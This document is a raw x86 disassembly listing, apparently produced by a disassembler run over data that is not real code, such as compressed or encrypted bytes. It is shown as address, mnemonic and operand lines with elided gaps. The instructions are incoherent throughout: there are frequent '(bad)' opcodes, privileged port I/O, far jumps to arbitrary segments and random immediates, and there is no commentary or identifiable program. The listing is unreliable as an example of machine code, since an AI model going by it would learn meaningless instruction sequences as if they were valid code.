  424cd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424cd4:	cld    
  424cd5:	add    eax,0x9afd4cb0
  424cda:	inc    edi
  424cdb:	pushf  
  424cdc:	ficom  WORD PTR [esi+0x759ea6]
  424ce2:	xor    al,0x3
  424ce4:	mov    ebx,edx
  424ce6:	sub    DWORD PTR [edi+0x1686d3fb],ebp
  424cec:	xchg   ebp,eax
  424ced:	int3   
	...
  424d56:	ins    BYTE PTR es:[edi],dx
  424d57:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424d5e:	bound  ebx,QWORD PTR [ebx-0x28e5ae58]
  424d64:	cwde   
  424d65:	and    DWORD PTR [edi-0x75],esp
  424d68:	add    DWORD PTR [eax],eax
  424d6a:	add    BYTE PTR [ecx],al
  424d6c:	add    BYTE PTR [eax],al
  424d6e:	je     0x424d73
  424d70:	adc    ah,0x28
  424d73:	addr16 xchg esp,eax
  424d75:	scas   eax,DWORD PTR es:[edi]
  424d76:	cmp    edi,DWORD PTR [ecx+0x5dd89f3a]
  424d7c:	sub    ebx,DWORD PTR [edx]
  424d7e:	cmp    BYTE PTR [ebx-0x553a466d],bh
  424d84:	cwde   
  424d85:	jl     0x424d64
  424d87:	icebp  
  424d88:	test   eax,0x50a997f5
  424d8d:	jge    0x424d46
  424d8f:	pop    ebx
  424d90:	xchg   ebp,eax
  424d91:	ins    DWORD PTR es:[edi],dx
  424d92:	xchg   BYTE PTR [edx-0x6a4f627],dl
  424d98:	cmp    ecx,DWORD PTR [ebx]
  424d9a:	xchg   bl,dl
  424d9c:	enter  0x8438,0xf4
  424da0:	stc    
  424da1:	push   0xfffffffd
  424da3:	xor    BYTE PTR [esi-0x512a5a05],0x18
  424daa:	in     eax,0x4f
  424dac:	jo     0x424d80
  424dae:	fsubr  DWORD PTR [edi]
  424db0:	mov    ds:0x5887ad6b,al
  424db5:	dec    eax
  424db6:	scas   al,BYTE PTR es:[edi]
  424db7:	(bad)  
  424db8:	cmc    
  424db9:	mov    dl,0xb8
  424dbb:	mov    eax,DWORD PTR [eax]
  424dbd:	test   al,0x67
  424dbf:	jbe    0x424daa
  424dc1:	ret    0x9396
  424dc4:	icebp  
  424dc5:	aad    0x4c
  424dc7:	adc    eax,0x3c85b8fa
  424dcc:	adc    esi,esp
  424dce:	mov    eax,ds:0xcf2bcaa6
  424dd3:	imul   ebp,DWORD PTR es:[eax+0x65],0xffffffe4
  424dd8:	xchg   DWORD PTR [edi+edx*8],esi
  424ddb:	jno    0x424d88
  424ddd:	jo     0x424d75
  424ddf:	jl     0x424da1
  424de1:	mov    al,ds:0xf7ae3d33
  424de6:	pop    eax
  424de7:	outs   dx,DWORD PTR ds:[esi]
  424de8:	test   eax,0x126d02a2
  424ded:	jg     0x424d84
  424def:	imul   esi,edx,0xffffffc7
  424df2:	retf   0xb4d1
  424df5:	add    eax,0xd58ce60b
  424dfa:	sbb    DWORD PTR [esp+ebp*1],ebx
  424dfd:	push   es
  424dfe:	pop    ebx
  424dff:	(bad)  
  424e00:	retf   
  424e01:	adc    al,0x64
  424e03:	jg     0x424e6f
  424e05:	mov    al,0x26
  424e07:	push   0xffffffbf
  424e09:	das    
  424e0a:	fwait
  424e0b:	sub    dl,BYTE PTR [eax]
  424e0d:	sub    BYTE PTR [eax-0xd7f9a13],bl
  424e13:	inc    esp
  424e14:	not    DWORD PTR [ebp-0x615cebb3]
  424e1a:	loope  0x424dcf
  424e1c:	push   esp
  424e1d:	fldcw  WORD PTR [edx+0x1e]
  424e20:	jmp    0x293a5cf9
  424e25:	popa   
  424e26:	mov    esp,0x576c4fb4
  424e2b:	(bad)  [esi+0x46]
  424e2e:	loopne 0x424dce
  424e30:	inc    edx
  424e31:	jecxz  0x424e88
  424e33:	bound  esi,QWORD PTR [ecx-0x3e628e58]
  424e39:	jae    0x424e1a
  424e3b:	inc    esp
  424e3c:	addr16 ret 
  424e3e:	pop    ecx
  424e3f:	cmp    esp,ebp
  424e41:	adc    DWORD PTR [eax-0x52],ebx
  424e44:	shl    DWORD PTR [eax],cl
  424e46:	in     al,dx
  424e47:	popa   
  424e48:	int    0xc6
  424e4a:	add    DWORD PTR ds:0x32a1ce0,edx
  424e50:	or     dh,BYTE PTR [ecx]
  424e52:	or     esi,DWORD PTR ds:0xc9be5e7b
  424e58:	pop    eax
  424e59:	scas   al,BYTE PTR es:[edi]
  424e5a:	sbb    ecx,DWORD PTR [eax]
  424e5c:	(bad)  
  424e5d:	std    
  424e5e:	jns    0x424e8d
  424e60:	fdiv   DWORD PTR [edi-0x6f602a11]
  424e66:	and    BYTE PTR [edi-0x41],0x40
  424e6a:	or     DWORD PTR es:[esi+0x9],0x0
	...
  424ed5:	add    BYTE PTR ds:0xf361d20c,bh
  424edb:	(bad)  
  424edc:	mov    edi,0x4bceee5c
  424ee1:	jns    0x424ef0
  424ee3:	div    bl
  424ee5:	mov    dl,0x67
  424ee7:	mov    WORD PTR [ecx],es
  424ee9:	add    BYTE PTR [eax],al
  424eeb:	add    DWORD PTR [eax],eax
  424eed:	add    BYTE PTR [edi],dh
  424eef:	pop    ss
  424ef0:	mov    ecx,0xaed7a9d3
  424ef5:	adc    al,bh
  424ef7:	mov    bh,0xe5
  424ef9:	push   ebx
  424efa:	icebp  
  424efb:	fmul   QWORD PTR [esi+0x1f00b98b]
  424f01:	shl    BYTE PTR [esi+0x6eac44a7],cl
  424f07:	xor    dl,cl
  424f09:	ins    DWORD PTR es:[edi],dx
  424f0a:	or     dh,ah
  424f0c:	popf   
  424f0d:	fcmovu st,st(3)
  424f0f:	ins    BYTE PTR es:[edi],dx
  424f10:	scas   al,BYTE PTR es:[edi]
  424f11:	sbb    esi,DWORD PTR [edi]
  424f13:	inc    esi
  424f14:	and    eax,0x7bc45102
  424f19:	mov    DWORD PTR [edx+edi*2+0x79cad356],ebx
  424f20:	rcr    DWORD PTR [edx+ecx*2],cl
  424f23:	fisttp DWORD PTR [ebp+0xc1c3962]
  424f29:	(bad)  
  424f2a:	out    dx,al
  424f2b:	jae    0x424eb5
  424f2d:	retf   
  424f2e:	dec    ebp
  424f2f:	or     al,0x6d
  424f31:	push   ecx
  424f32:	sub    eax,0xfd70358f
  424f37:	mov    al,0x94
  424f39:	mov    eax,ds:0xd26cc777
  424f3e:	scas   al,BYTE PTR es:[edi]
  424f3f:	mov    bl,0xef
  424f41:	in     al,0x7b
  424f43:	inc    esi
  424f44:	mov    ds:0xeaec36ec,al
  424f49:	mov    edi,0xc7664d51
  424f4e:	js     0x424f04
  424f50:	push   ds
  424f51:	in     eax,dx
  424f52:	sub    eax,0x2d9d6b94
  424f57:	aaa    
  424f58:	js     0x424f24
  424f5a:	rcr    DWORD PTR [edx-0x17],0xbd
  424f5e:	mov    ebp,0x2f14fcab
  424f63:	mov    esi,0x56873aed
  424f68:	test   BYTE PTR [edx-0x41263d9c],dl
  424f6e:	inc    edi
  424f6f:	inc    esp
  424f70:	and    BYTE PTR [ecx+0x6749abc1],0x1d
  424f77:	sbb    al,0x14
  424f79:	sub    cl,bl
  424f7b:	mov    esi,0xdc40afdf
  424f80:	fwait
  424f81:	and    eax,0x86927d98
  424f86:	push   eax
  424f87:	clc    
  424f88:	jne    0x424f9c
  424f8a:	push   ds
  424f8b:	(bad)  
  424f8c:	cli    
  424f8d:	push   eax
  424f8e:	test   BYTE PTR [eax+esi*1-0x42],bl
  424f92:	or     DWORD PTR [ecx+0x75],esp
  424f95:	jmp    0x5bc4909
  424f9a:	retf   
  424f9b:	je     0x424f6a
  424f9d:	nop
  424f9e:	frstor [esi-0x1826e2f1]
  424fa4:	or     edx,DWORD PTR [ebp+0x3c714fb0]
  424faa:	sub    BYTE PTR [ebx],0x11
  424fad:	(bad)  
  424fae:	jnp    0x424f68
  424fb0:	je     0x424f95
  424fb2:	jb     0x42502c
  424fb4:	gs aam 0xf8
  424fb7:	out    dx,eax
  424fb8:	xor    BYTE PTR [edx],ch
  424fba:	stos   DWORD PTR es:[edi],eax
  424fbb:	in     al,0xd8
  424fbd:	ficom  DWORD PTR [esi-0x29]
  424fc0:	icebp  
  424fc1:	mov    dl,0x55
  424fc3:	xor    al,0x7e
  424fc5:	add    bl,BYTE PTR [ebx-0x5382f137]
  424fcb:	inc    edx
  424fcc:	cdq    
  424fcd:	sub    al,0x2a
  424fcf:	and    ecx,DWORD PTR [edx-0xf]
  424fd2:	xor    al,BYTE PTR [ebx+edi*2]
  424fd5:	pop    ds
  424fd6:	mov    al,ds:0xbfbc0b08
  424fdb:	ret    0x9ef3
  424fde:	fmulp  st(7),st
  424fe0:	das    
  424fe1:	dec    edi
  424fe2:	mul    BYTE PTR [ebx-0x6374fce3]
  424fe8:	or     DWORD PTR [esi-0x3c],eax
  424feb:	or     BYTE PTR [ebx],bh
  424fed:	xchg   ebp,eax
	...
  425056:	dec    ebx
  425057:	push   ss
  425058:	int    0x41
  42505a:	fstp   st(3)
  42505c:	iret   
  42505d:	push   ds
  42505e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42505f:	fadd   st(3),st
  425061:	dec    eax
  425062:	in     eax,dx
  425063:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425064:	sub    BYTE PTR [edi],0x67
  425067:	lea    eax,[ecx]
  425069:	add    BYTE PTR [eax],al
  42506b:	add    DWORD PTR [eax],eax
  42506d:	add    BYTE PTR [edx],cl
  42506f:	mov    BYTE PTR [edx+0x2a],ch
  425072:	sbb    bh,0xc0
  425075:	ficomp WORD PTR [edx]
  425077:	out    dx,al
  425078:	js     0x425036
  42507a:	stos   BYTE PTR es:[edi],al
  42507b:	and    DWORD PTR [eax-0x3e12d4d6],edi
  425081:	int    0x4b
  425083:	fcmovne st,st(5)
  425085:	popa   
  425086:	mov    esi,0x9974ada9
  42508b:	(bad)  
  42508c:	and    eax,0xc1d86501
  425091:	adc    edx,DWORD PTR [ebx+0x545160c6]
  425097:	call   FWORD PTR [ebx-0x1972cd00]
  42509d:	pop    ds
  42509e:	stos   BYTE PTR es:[edi],al
  42509f:	aaa    
  4250a0:	dec    ebx
  4250a1:	neg    DWORD PTR [ebx+ebp*8+0x50]
  4250a5:	xchg   edx,eax
  4250a6:	jecxz  0x4250d7
  4250a8:	dec    edi
  4250a9:	inc    esi
  4250aa:	loop   0x42505a
  4250ac:	(bad)  
  4250ad:	repz push 0x7cb03d18
  4250b3:	sub    dh,cl
  4250b5:	add    eax,0x694e097c
  4250ba:	sbb    edx,DWORD PTR [eax]
  4250bc:	push   0xe1589d9
  4250c1:	xchg   ebx,eax
  4250c2:	jg     0x42505e
  4250c4:	fist   DWORD PTR [edx]
  4250c6:	(bad)  
  4250c7:	cmp    edi,0x9c9d8f7c
  4250cd:	xchg   esp,eax
  4250ce:	sbb    BYTE PTR [ebp+edi*2+0x36],bh
  4250d2:	ret    0x1c15
  4250d5:	fcomi  st,st(4)
  4250d7:	sub    al,0x8c
  4250d9:	cdq    
  4250da:	adc    edx,DWORD PTR [ecx+ecx*2]
  4250dd:	mov    ebx,0xe0ed99ca
  4250e2:	pop    edx
  4250e3:	inc    eax
  4250e4:	test   DWORD PTR [esi],ebp
  4250e6:	xchg   ax,ax
  4250e8:	fdiv   st,st(6)
  4250ea:	xchg   BYTE PTR [ebp+ebx*8+0x31],bh
  4250ee:	xchg   edi,eax
  4250ef:	dec    ebx
  4250f0:	hlt    
  4250f1:	xor    al,0xb8
  4250f3:	leave  
  4250f4:	jp     0x42515a
  4250f6:	add    DWORD PTR [edi+0x22],ebx
  4250f9:	pop    esi
  4250fa:	icebp  
  4250fb:	cli    
  4250fc:	pop    ebp
  4250fd:	shl    DWORD PTR [edi+0x5],1
  425100:	inc    eax
  425101:	int3   
  425102:	mov    dh,0x15
  425104:	repz push 0x82a2ffa2
  42510a:	adc    al,0xc4
  42510c:	push   cs
  42510d:	lods   eax,DWORD PTR ds:[esi]
  42510e:	in     al,dx
  42510f:	std    
  425110:	ds mov ebp,0xe58e42e7
  425116:	jecxz  0x42513e
  425118:	test   eax,0x3671f07
  42511d:	jp     0x425133
  42511f:	inc    ebp
  425120:	fwait
  425121:	fs das 
  425123:	fadd   st(2),st
  425125:	ret    0x8784
  425128:	xchg   esp,eax
  425129:	jo     0x4251a5
  42512b:	inc    ebp
  42512c:	jge    0x425148
  42512e:	in     eax,dx
  42512f:	mov    BYTE PTR [ebp-0x702984ef],dl
  425135:	pop    eax
  425136:	push   ecx
  425137:	dec    esp
  425138:	mov    cl,0x4a
  42513a:	jns    0x425167
  42513c:	mov    esi,0xf260ffe1
  425141:	rol    DWORD PTR [edi],1
  425143:	in     eax,dx
  425144:	ins    DWORD PTR es:[edi],dx
  425145:	pushf  
  425146:	mov    esp,0x535c2f61
  42514b:	adc    BYTE PTR [ebx],0xbb
  42514e:	ret    0x7fd3
  425151:	jp     0x425152
  425153:	cmp    eax,0xa7bd1701
  425158:	jnp    0x4251b5
  42515a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42515b:	lods   al,BYTE PTR ds:[esi]
  42515c:	add    esp,edi
  42515e:	cs (bad) 
  425160:	(bad)  
  425161:	mov    cl,0x8e
  425163:	xor    esp,DWORD PTR [edi+0x52]
  425166:	adc    eax,0xd45ebda9
  42516b:	sahf   
  42516c:	test   BYTE PTR ds:0x0,al
	...
  4251d6:	ficom  WORD PTR [ecx]
  4251d8:	lahf   
  4251d9:	and    ebx,edi
  4251db:	scas   eax,DWORD PTR es:[edi]
  4251dc:	(bad)  
  4251dd:	std    
  4251de:	out    dx,al
  4251df:	jmp    0xf65:0xf14c92e8
  4251e6:	mov    es,WORD PTR [bx+di]
  4251e9:	add    BYTE PTR [eax],al
  4251eb:	add    DWORD PTR [eax],eax
  4251ed:	add    bl,ah
  4251ef:	pop    ebp
  4251f0:	push   0x1e
  4251f2:	test   al,0xb9
  4251f4:	in     al,dx
  4251f5:	jmp    0x22f7:0x5ea7ef27
  4251fc:	add    ch,al
  4251fe:	fisubr WORD PTR [ebp-0x5b]
  425201:	cwde   
  425202:	push   ss
  425203:	or     al,0x9a
  425205:	(bad)  
  425206:	sbb    eax,DWORD PTR ds:[eax+ecx*4+0x76773b6d]
  42520e:	jmp    0x88e7:0xe7fad68a
  425215:	mov    ch,0x9f
  425217:	xchg   ecx,eax
  425218:	mov    edi,DWORD PTR [ecx]
  42521a:	stos   BYTE PTR es:[edi],al
  42521b:	in     al,dx
  42521c:	test   al,0x36
  42521e:	mov    al,ds:0xc80d89a8
  425223:	je     0x425271
  425225:	jmp    0x8fb0dea3
  42522a:	aad    0x5a
  42522c:	dec    edi
  42522d:	add    dh,dl
  42522f:	loope  0x4252a2
  425231:	mov    esi,cs
  425233:	imul   ecx,DWORD PTR [ebx-0x71f48906],0x57a0fe4e
  42523d:	int3   
  42523e:	cmp    BYTE PTR [edi+0x3bdafe90],bh
  425244:	repnz push ebp
  425246:	out    0xfd,al
  425248:	in     eax,0x2f
  42524a:	loope  0x42520b
  42524c:	xchg   ecx,eax
  42524d:	adc    al,0xa7
  42524f:	sub    BYTE PTR gs:[esi],al
  425252:	adc    cl,BYTE PTR [ecx+0x5c36ad78]
  425258:	and    ax,0xcb67
  42525c:	xchg   ebx,eax
  42525d:	sub    edx,ebx
  42525f:	shl    BYTE PTR [ebp-0x19f6ac47],cl
  425265:	push   0xffffff83
  425267:	jnp    0x4252ca
  425269:	mov    dl,0x90
  42526b:	mov    eax,0xe7e6e538
  425270:	pop    esi
  425271:	imul   esp,DWORD PTR [ebp+0x2fa7b71e],0x196773b2
  42527b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42527c:	ret    
  42527d:	fsubr  QWORD PTR [edi+0xd]
  425280:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  425282:	push   ss
  425283:	loop   0x42520b
  425285:	test   esi,ecx
  425287:	outs   dx,DWORD PTR ds:[esi]
  425288:	pop    eax
  425289:	xor    al,0xa3
  42528b:	test   al,0x3f
  42528d:	sahf   
  42528e:	inc    eax
  42528f:	adc    ebx,ecx
  425291:	je     0x425237
  425293:	stc    
  425294:	or     al,0x51
  425296:	sbb    eax,0xb5709cee
  42529b:	fst    st(5)
  42529d:	jo     0x2e6ae3dd
  4252a3:	cmp    eax,0x5c0d769a
  4252a8:	test   al,0x9c
  4252aa:	mov    cl,0x7a
  4252ac:	jnp    0x42528f
  4252ae:	mov    dl,0xce
  4252b0:	inc    ebx
  4252b1:	pushf  
  4252b2:	into   
  4252b3:	mov    dl,0x8b
  4252b5:	jbe    0x4252f3
  4252b7:	sub    ebx,DWORD PTR [ebp+0x5b6fce68]
  4252bd:	popf   
  4252be:	inc    esi
  4252bf:	mov    eax,ds:0x160c6315
  4252c4:	or     eax,DWORD PTR [esi+0x6a]
  4252c7:	in     al,dx
  4252c8:	xor    BYTE PTR [ebp-0x41cf3272],bh
  4252ce:	jns    0x42533f
  4252d0:	daa    
  4252d1:	pop    edi
  4252d2:	outs   dx,DWORD PTR ds:[esi]
  4252d3:	sti    
  4252d4:	sub    BYTE PTR [ebp+0x73],cl
  4252d7:	sar    dh,cl
  4252d9:	add    eax,0xe031e94e
  4252de:	inc    ebx
  4252df:	sub    bh,BYTE PTR [ebx+0x47]
  4252e2:	sub    DWORD PTR [edx-0x5ef18af1],0xdbc71bd4
  4252ec:	fld    QWORD PTR ds:0x0
	...
  425356:	lods   al,BYTE PTR ds:[esi]
  425357:	les    esi,FWORD PTR [ebx-0x32]
  42535a:	jnp    0x42535b
  42535c:	mov    ebp,0x45495ee6
  425361:	icebp  
  425362:	std    
  425363:	dec    ebp
  425364:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425365:	push   ebx
  425366:	pop    DWORD PTR [bx+di]
  425369:	add    BYTE PTR [eax],al
  42536b:	add    DWORD PTR [eax],eax
  42536d:	add    BYTE PTR [edx-0xc356308],bl
  425373:	and    DWORD PTR [ebx+edi*2-0x50],esp
  425377:	push   ebp
  425378:	adc    al,0x28
  42537a:	into   
  42537b:	cld    
  42537c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42537d:	jnp    0x4253db
  42537f:	hlt    
  425380:	jmp    DWORD PTR [ebx-0x39]
  425383:	mov    bl,0xde
  425385:	dec    ebx
  425386:	mov    esp,0xe3da3c80
  42538b:	inc    edx
  42538c:	sbb    esp,DWORD PTR [ebp+ecx*1+0x2e]
  425390:	jg     0x42540f
  425392:	mov    ds:0xcd8a7673,al
  425397:	or     eax,0x66fa143b
  42539c:	dec    ebp
  42539d:	xchg   edi,eax
  42539e:	imul   ebx,DWORD PTR [edx],0x7830efc
  4253a4:	fstp   QWORD PTR [esi]
  4253a6:	mov    dh,0x7
  4253a8:	push   ebp
  4253a9:	inc    eax
  4253aa:	push   0xc9220b1a
  4253af:	lea    ecx,[eax-0x21]
  4253b2:	pop    edi
  4253b3:	xor    esp,DWORD PTR [esi+eiz*2+0x50]
  4253b7:	es jge 0x425429
  4253ba:	inc    esi
  4253bb:	ret    
  4253bc:	dec    edi
  4253bd:	xlat   BYTE PTR ds:[ebx]
  4253be:	test   BYTE PTR [eax-0x6390493a],bh
  4253c4:	pushf  
  4253c5:	mov    cl,0xfa
  4253c7:	push   eax
  4253c8:	sub    ecx,ecx
  4253ca:	stc    
  4253cb:	pop    edi
  4253cc:	popa   
  4253cd:	jmp    0xdbf0:0x9d0342a8
  4253d4:	nop
  4253d5:	test   al,0x29
  4253d7:	xchg   esi,eax
  4253d8:	cmp    eax,0xdfe88a2d
  4253dd:	adc    BYTE PTR [edi-0x2e117b07],bh
  4253e3:	pop    ss
  4253e4:	in     al,0xd5
  4253e6:	dec    esp
  4253e7:	iret   
  4253e8:	hlt    
  4253e9:	or     dl,BYTE PTR [esi+0xc49769c]
  4253ef:	cmp    al,0xd3
  4253f1:	and    esp,DWORD PTR [eax+esi*8+0x29]
  4253f5:	leave  
  4253f6:	aad    0x60
  4253f8:	pop    eax
  4253f9:	scas   eax,DWORD PTR es:[edi]
  4253fa:	int    0x75
  4253fc:	lds    ebp,FWORD PTR [ebp+0x36]
  4253ff:	lea    ebp,es:[esi]
  425402:	arpl   WORD PTR [esi-0x4c7ed06d],cx
  425408:	jp     0x42542d
  42540a:	jge    0x4253f3
  42540c:	rcl    DWORD PTR [ecx+0x74],cl
  42540f:	loope  0x4253ff
  425411:	pusha  
  425412:	ror    bl,0xa3
  425415:	xor    DWORD PTR [ecx],esi
  425417:	imul   ebx,DWORD PTR [esp+ecx*1+0x3b],0xfffffffe
  42541c:	in     al,0x77
  42541e:	repz rcl BYTE PTR [esi+0x15],1
  425422:	cwde   
  425423:	pop    ss
  425424:	ds push 0xc680f0bd
  42542a:	adc    al,0x97
  42542c:	jo     0x4253bf
  42542e:	push   eax
  42542f:	adc    dh,BYTE PTR [edi-0x19]
  425432:	jp     0x425447
  425434:	sbb    eax,0xa8597ad
  425439:	in     eax,dx
  42543a:	inc    ebp
  42543b:	(bad)  [ebx-0x5d]
  42543e:	pop    ss
  42543f:	push   ds
  425440:	aam    0xd3
  425442:	add    BYTE PTR [ebx+0x79],ah
  425445:	aad    0xd
  425447:	sbb    dh,BYTE PTR [esi]
  425449:	add    DWORD PTR [eax+0x2cd1b7a2],ebx
  42544f:	fdivr  QWORD PTR [edi+0x4d9a6fee]
  425455:	aaa    
  425456:	jns    0x42544f
  425458:	loopne 0x425427
  42545a:	or     eax,0x2b0479a2
  42545f:	out    dx,eax
  425460:	pushf  
  425461:	fwait
  425462:	sti    
  425463:	mov    dl,0x42
  425465:	scas   al,BYTE PTR es:[edi]
  425466:	or     ch,BYTE PTR [edi]
  425468:	popf   
  425469:	xchg   BYTE PTR [ebx-0x2a],ch
  42546c:	mov    ebx,0xc8
	...
  4254d5:	add    BYTE PTR [edx+0x9],al
  4254d8:	les    ebp,FWORD PTR [ecx-0x14901231]
  4254de:	fcomp  DWORD PTR [edx]
  4254e1:	add    esp,DWORD PTR [esi-0x1b]
  4254e4:	inc    ebp
  4254e5:	and    ah,BYTE PTR [edi-0x70]
  4254e8:	add    DWORD PTR [eax],eax
  4254ea:	add    BYTE PTR [ecx],al
  4254ec:	add    BYTE PTR [eax],al
  4254ee:	pop    ds
  4254ef:	jo     0x4254be
  4254f1:	scas   eax,DWORD PTR es:[edi]
  4254f2:	ret    0x6ad3
  4254f5:	popf   
  4254f6:	aas    
  4254f7:	push   esi
  4254f8:	jno    0x425551
  4254fa:	das    
  4254fb:	xlat   BYTE PTR ds:[ebx]
  4254fc:	sbb    DWORD PTR [ebx+0x61],ebx
  4254ff:	xor    ebp,DWORD PTR [edi*2-0x7f5b62af]
  425506:	pop    esp
  425507:	test   BYTE PTR [edx],bl
  425509:	dec    edi
  42550a:	inc    edi
  42550b:	jle    0x4254c4
  42550d:	dec    ecx
  42550e:	push   ebx
  42550f:	fs add al,0x62
  425512:	push   0x14b0363a
  425517:	(bad)  
  425518:	adc    eax,0x3adeb27d
  42551d:	inc    ecx
  42551e:	dec    esp
  42551f:	inc    ecx
  425520:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425521:	cld    
  425522:	aaa    
  425523:	(bad)  
  425524:	clc    
  425525:	push   esp
  425526:	mov    bh,0xfa
  425528:	mov    eax,0x28029035
  42552d:	pop    esp
  42552e:	jmp    0x3fd1d346
  425533:	push   edi
  425534:	rdtsc  
  425536:	fist   DWORD PTR [ebp-0x6b]
  425539:	mov    ch,0x82
  42553b:	fld    DWORD PTR [ebx-0x5acdb9a8]
  425541:	frstor [ebx+0x6d]
  425544:	add    bh,dl
  425546:	xchg   ebx,eax
  425547:	pop    edx
  425548:	outs   dx,BYTE PTR ds:[esi]
  425549:	xor    esp,ebx
  42554b:	imul   ebx,DWORD PTR [ebx],0xd741d146
  425551:	test   ebx,ebp
  425553:	aaa    
  425554:	popa   
  425555:	sub    al,0xf8
  425557:	jecxz  0x4255b9
  425559:	inc    ebx
  42555a:	js     0x42555e
  42555c:	lods   eax,DWORD PTR ds:[esi]
  42555d:	mov    BYTE PTR [edx],dl
  42555f:	pop    ss
  425560:	jb     0x425588
  425562:	jecxz  0x42559c
  425564:	push   edi
  425565:	pop    esp
  425566:	fdiv   DWORD PTR [esi-0x435b4b0a]
  42556c:	mov    dh,0x88
  42556e:	cmp    DWORD PTR [ebp+0x2dc007be],edi
  425574:	jmp    0x425555
  425576:	xor    ax,0x35a4
  42557a:	fdiv   QWORD PTR [ebx+0x5f]
  42557d:	and    BYTE PTR [esi-0x70],dl
  425580:	cdq    
  425581:	int    0x26
  425583:	jbe    0x425508
  425585:	push   edi
  425586:	inc    edi
  425587:	sahf   
  425588:	fisub  WORD PTR [edi]
  42558a:	mov    BYTE PTR [eax-0x1f],bl
  42558d:	xor    BYTE PTR [esi],ah
  42558f:	outs   dx,BYTE PTR ds:[esi]
  425590:	mov    al,ah
  425592:	shl    ebp,0xd1
  425595:	cmp    BYTE PTR [ebx-0x12],al
  425598:	inc    esp
  425599:	loope  0x425608
  42559b:	mov    eax,0x33e1872c
  4255a0:	dec    esi
  4255a1:	mov    es,esp
  4255a3:	cmc    
  4255a4:	in     al,dx
  4255a5:	mov    WORD PTR [ebx-0x14],gs
  4255a8:	(bad)  
  4255a9:	rcl    DWORD PTR [ebp+0x49],1
  4255ac:	sbb    DWORD PTR [edx+0x41],0x59efe9e4
  4255b3:	jno    0x425632
  4255b5:	push   esi
  4255b6:	dec    edi
  4255b7:	inc    edx
  4255b8:	sub    edi,DWORD PTR [ecx]
  4255ba:	fnstcw WORD PTR [edi+0x5f]
  4255bd:	imul   edi,ecx,0xffffffad
  4255c0:	pushf  
  4255c1:	nop
  4255c2:	data16 and BYTE PTR [si+0x28],ch
  4255c7:	jge    0x425634
  4255c9:	jnp    0x42562b
  4255cb:	push   esp
  4255cc:	fidivr WORD PTR [ebp+0x593fe54c]
  4255d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4255d3:	and    eax,0xde3b06b6
  4255d8:	les    eax,FWORD PTR ss:[edx]
  4255db:	add    eax,0xfcfe9f54
  4255e0:	jbe    0x4255bf
  4255e2:	sub    DWORD PTR [ebx],esp
  4255e4:	les    esi,FWORD PTR cs:[edi]
  4255e7:	pop    esi
  4255e8:	sbb    eax,0x3d74134c
  4255ed:	adc    DWORD PTR [eax],eax
	...
  425653:	add    BYTE PTR [eax],al
  425655:	add    ah,al
  425657:	jmp    0xfef4:0xfe6e7a4e
  42565e:	dec    ebp
  42565f:	mov    esi,0x261df13a
  425664:	das    
  425665:	(bad)  
  425666:	addr16 xchg ecx,eax
  425668:	add    DWORD PTR [eax],eax
  42566a:	add    BYTE PTR [ecx],al
  42566c:	add    BYTE PTR [eax],al
  42566e:	test   eax,0xeadb90f7
  425673:	das    
  425674:	xchg   BYTE PTR [eax],bl
  425676:	mov    al,ds:0xe6692035
  42567b:	jmp    0xec206aee
  425680:	dec    esi
  425681:	imul   ebp,DWORD PTR [eax+edx*4-0x1e204282],0x36
  425689:	xchg   DWORD PTR [edx+0x6e],edi
  42568c:	and    al,BYTE PTR [eax-0x1fe4dd5a]
  425692:	sub    bh,cl
  425694:	lods   al,BYTE PTR ds:[esi]
  425695:	add    ebp,eax
  425697:	push   ebp
  425698:	cs mov ds,edx
  42569b:	fist   DWORD PTR [esi+0x23c2636]
  4256a1:	xor    BYTE PTR [ecx-0x27cfeb8c],ah
  4256a7:	ds pop ss
  4256a9:	mov    dh,0x2b
  4256ab:	push   ss
  4256ac:	xlat   BYTE PTR ds:[ebx]
  4256ad:	aam    0x5d
  4256af:	pusha  
  4256b0:	aaa    
  4256b1:	in     eax,0x75
  4256b3:	inc    eax
  4256b4:	jnp    0x425658
  4256b6:	mov    bh,0xed
  4256b8:	sub    eax,0x72261006
  4256bd:	pop    es
  4256be:	dec    ebp
  4256bf:	adc    al,0x2e
  4256c1:	jnp    0x425651
  4256c3:	mov    ebp,0x8aa228b8
  4256c8:	fs xor al,cl
  4256cb:	pop    es
  4256cc:	dec    esi
  4256cd:	add    edx,ebx
  4256cf:	loop   0x42569c
  4256d1:	push   0xffffffc0
  4256d3:	fcom   st(4)
  4256d5:	mov    esp,0x4b4eaec5
  4256da:	push   0xffffffdd
  4256dc:	dec    edi
  4256dd:	(bad)  
  4256df:	inc    edi
  4256e0:	jno    0x42573d
  4256e2:	xchg   edi,eax
  4256e3:	in     al,0x8d
  4256e5:	int    0x23
  4256e7:	inc    ebp
  4256e8:	mov    BYTE PTR [eax+ebp*4+0x44],al
  4256ec:	fistp  WORD PTR [ecx]
  4256ee:	sub    al,al
  4256f0:	inc    bp
  4256f2:	(bad)  
  4256f3:	cmp    eax,0x12ce4e4c
  4256f8:	xchg   dh,bh
  4256fa:	cmp    edi,DWORD PTR [edx+0x23]
  4256fd:	cmp    esi,DWORD PTR [ebx+0x57]
  425700:	jnp    0x42574a
  425702:	out    0xea,eax
  425704:	dec    ecx
  425705:	mov    edx,0x617463b
  42570a:	adc    esp,esi
  42570c:	cmp    bh,BYTE PTR [edi+0x2fd26367]
  425712:	mov    bh,0x38
  425714:	outs   dx,BYTE PTR ds:[esi]
  425715:	or     ebp,DWORD PTR [ebx]
  425717:	(bad)  
  425718:	out    0xb8,al
  42571a:	(bad)  
  42571b:	mov    cl,BYTE PTR [ebp+edx*8-0x31370213]
  425722:	or     DWORD PTR fs:[eax+0x781bdb3],ebx
  425729:	dec    edi
  42572a:	cmc    
  42572b:	cld    
  42572c:	repnz scas al,BYTE PTR es:[edi]
  42572e:	push   ss
  42572f:	popa   
  425730:	pop    esi
  425731:	pop    ebp
  425732:	sbb    bl,BYTE PTR [edx+0x7d4856a2]
  425738:	stos   BYTE PTR es:[edi],al
  425739:	and    al,0xa9
